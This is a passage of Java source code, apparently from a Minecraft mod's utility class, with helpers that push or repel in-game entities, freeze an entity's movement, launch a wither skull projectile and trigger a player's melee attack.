      if (ent != entity)
      {
        Vec3 p = Vec3.createVectorHelper(x, y, z);
        Vec3 t = Vec3.createVectorHelper(ent.posX, ent.posY, ent.posZ);
        double distance = p.distanceTo(t) + 0.1D;
        Vec3 r = Vec3.createVectorHelper(t.xCoord - p.xCoord, t.yCoord - p.yCoord, t.zCoord - p.zCoord);
        
        ent.motionX += r.xCoord / 1.5D / distance * bl;
        ent.motionY += r.yCoord / 1.5D / distance * bl;
        ent.motionZ += r.zCoord / 1.5D / distance * bl;
      }
    }
  }
  
  public static void repelEntities(World world, double x, double y, double z, double fr, double bl)
  {
    AxisAlignedBB effectBounds = AxisAlignedBB.getBoundingBox(x - fr, y - fr, z - fr, x + fr, y + fr, z + fr).expand(fr, fr, fr);
    List<Entity> list = world.getEntitiesWithinAABB(Entity.class, effectBounds);
    for (Entity ent : list)
    {
      Vec3 p = Vec3.createVectorHelper(x, y, z);
      Vec3 t = Vec3.createVectorHelper(ent.posX, ent.posY, ent.posZ);
      double distance = p.distanceTo(t) + 0.1D;
      Vec3 r = Vec3.createVectorHelper(t.xCoord - p.xCoord, t.yCoord - p.yCoord, t.zCoord - p.zCoord);
      
      ent.motionX += r.xCoord / 1.5D / distance * bl;
      ent.motionY += r.yCoord / 1.5D / distance * bl;
      ent.motionZ += r.zCoord / 1.5D / distance * bl;
    }
  }
  
  public static void BackEntity(Entity entity)
  {
    if (entity.ticksExisted >= 2)
    {
      entity.setPosition(entity.prevPosX, entity.prevPosY, entity.prevPosZ);
      entity.rotationYaw = entity.prevRotationYaw;
      entity.rotationPitch = entity.prevRotationPitch;
      entity.motionX = 0.0D;
      if (!entity.onGround) {
        if (entity.worldObj.isRemote) {
          entity.motionY = -0.0D;
        } else {
          entity.motionY = -0.0D;
        }
      }
      entity.motionZ = 0.0D;
      entity.setAir(0);
      entity.fallDistance -= 0.076865F;
      entity.distanceWalkedModified = entity.prevDistanceWalkedModified;
      if ((entity instanceof EntityLivingBase))
      {
        EntityLivingBase living = (EntityLivingBase)entity;
        living.cameraPitch = living.prevCameraPitch;
        living.distanceWalkedModified = living.prevDistanceWalkedModified;
        living.renderYawOffset = living.prevRenderYawOffset;
        living.rotationYawHead = living.prevRotationYawHead;
        living.limbSwingAmount = living.prevLimbSwingAmount;
        living.swingProgress = living.prevSwingProgress;
        living.attackTime += 1;
        if ((living instanceof EntityTameable)) {
          living.motionY -= 1.0E-6D;
        }
      }
    }
  }
  
  public static void repelEntitiyLiving(World world, double x, double y, double z, double fr, double bl)
  {
    AxisAlignedBB effectBounds = AxisAlignedBB.getBoundingBox(x - fr, y - fr, z - fr, x + fr, y + fr, z + fr).expand(fr, fr, fr);
    List<Entity> list = world.getEntitiesWithinAABB(Entity.class, effectBounds);
    for (Entity ent : list) {
      if ((!(ent instanceof EntityItem)) && (!(ent instanceof EntityPlayer)))
      {
        Vec3 p = Vec3.createVectorHelper(x, y, z);
        Vec3 t = Vec3.createVectorHelper(ent.posX, ent.posY, ent.posZ);
        double distance = p.distanceTo(t) + 0.1D;
        Vec3 r = Vec3.createVectorHelper(t.xCoord - p.xCoord, t.yCoord - p.yCoord, t.zCoord - p.zCoord);
        
        ent.motionX += r.xCoord / 1.5D / distance * bl;
        ent.motionY += r.yCoord / 1.5D / distance * bl;
        ent.motionZ += r.zCoord / 1.5D / distance * bl;
      }
    }
  }
  public static EntityWitherSkull launchWitherSkullToCoords(EntityLivingBase EntityLiving, World world, double d3, double d4, double d5, double p_82209_2_, double p_82209_4_, double p_82209_6_)
  {
    double d6 = p_82209_2_ - d3;
    double d7 = p_82209_4_ - d4;
    double d8 = p_82209_6_ - d5;
    EntityWitherSkull entitywitherskull = new EntityWitherSkull(world, EntityLiving, d6, d7, d8);
    entitywitherskull.noClip = true;
    entitywitherskull.posY = d4;
    entitywitherskull.posX = d3;
    entitywitherskull.posZ = d5;
    world.spawnEntityInWorld(entitywitherskull);
    return entitywitherskull;
  }
  
  public static void AttackEntity(EntityPlayer player, Entity target)
  {
	player.onCriticalHit(target);
	player.onEnchantmentCritical(target);
    player.attackTargetEntityWithCurrentItem(target);
  }
  
  public static List<Entity> getSurroundingEntities(World world, double x, double y, double z, double p)
  {
    return world.getEntitiesWithinAABBExcludingEntity(null, AxisAlignedBB.getBoundingBox(x - p, y - p, z - p, x + p, y + p, z + p));
  }
  
  public static List<Entity> getSurroundingEntities(Entity target, double p)
  {
    return getSurroundingEntities(target.worldObj, target.posX, target.posY, target.posZ, p);
  }
}
